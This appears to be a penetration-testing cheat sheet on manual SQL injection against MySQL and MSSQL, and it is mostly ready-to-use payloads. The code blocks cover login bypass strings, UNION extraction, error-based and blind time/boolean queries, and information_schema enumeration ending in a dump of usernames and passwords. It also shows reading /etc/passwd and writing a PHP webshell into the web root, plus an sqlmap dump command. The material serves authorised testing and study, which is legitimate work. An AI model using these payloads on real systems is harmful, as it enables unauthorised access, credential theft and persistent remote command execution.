---
tool: Manual SQL injection
slug: sql-injection
kind: technique
stages: [web]
category: Auth bypass, UNION, blind and file access
platforms: [web]
services: [mysql, mssql]
ports: [3306, 1433]
tags: [sqli, union, blind, error-based, authentication-bypass, information_schema, sqlmap]
attack: [T1190]
summary: Doing by hand what sqlmap automates: break out of the query, bypass a login, pull data with UNION, read it blind when there is no output, enumerate the database through information_schema, and read or write files. The fundamentals that tell you when and how to point sqlmap, or finish the job it cannot.
references:
  - PortSwigger: SQL injection | https://portswigger.net/web-security/sql-injection
  - HackTricks: SQL injection | https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
---

## When to reach for it

Any input that reaches a SQL query. [sqlmap](/cpts/#tool-sqlmap) automates most of this, but you need the manual technique to find the injection, understand what the app allows, and handle cases sqlmap misses or where you cannot run it. Test every parameter, header and cookie, not just the obvious form field.

## Spot it and break out

Send a value that would break the query, then one that fixes it. An error, a changed response or a different row count confirms injection.

```sql
'           -- error or changed behaviour
' --        -- comment out the rest of the query
1' OR '1'='1 -- always-true
' ORDER BY 5-- -- probe column count (increment until it errors)
```

## Authentication bypass

Make the WHERE clause always true, or comment the password check out:

```sql
admin'--                 -- username field: comment out the password check
' OR 1=1-- -             -- return the first row (often admin)
admin' OR '1'='1
```

## UNION-based extraction

Match the column count, find a column that renders, then select data into it:

```sql
' UNION SELECT NULL,NULL,NULL-- -            -- match ORDER BY count
' UNION SELECT 1,2,3-- -                     -- find which numbers print
' UNION SELECT 1,@@version,database()-- -    -- banner + current DB
' UNION SELECT 1,user(),2-- -
```

## Error-based and blind

When output is suppressed, lean on errors, booleans or time:

```sql
-- error-based (MySQL): data comes back in the error text
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -
-- boolean blind: page differs on true vs false
' AND (SELECT SUBSTRING(database(),1,1))='s'-- -
-- time blind: true sleeps, false does not
' AND IF(1=1,SLEEP(3),0)-- -          -- MySQL
'; WAITFOR DELAY '0:0:3'-- -          -- MSSQL
```

## Enumerate the database

Walk `information_schema` to list databases, tables and columns, then dump:

```sql
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='app'-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,concat(username,0x3a,password),3 FROM users-- -
```

## Read and write files

With `FILE` privilege you can reach the filesystem, read config, or drop a webshell under the web root:

```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,'<?php system($_GET[c]); ?>',3 INTO OUTFILE '/var/www/html/sh.php'-- -
```

Hand the confirmed parameter to sqlmap to finish quickly: `sqlmap -r request.txt -p id --dump`.

## Notes

SQL injection reads, changes and sometimes destroys data, and a file write lands a shell, so it is high-impact: test only in scope, avoid `OR 1=1` UPDATE/DELETE on live data, and treat any dumped credentials or data as sensitive engagement loot. `--batch` and blind automation still hit the database hard, so mind the target's stability.
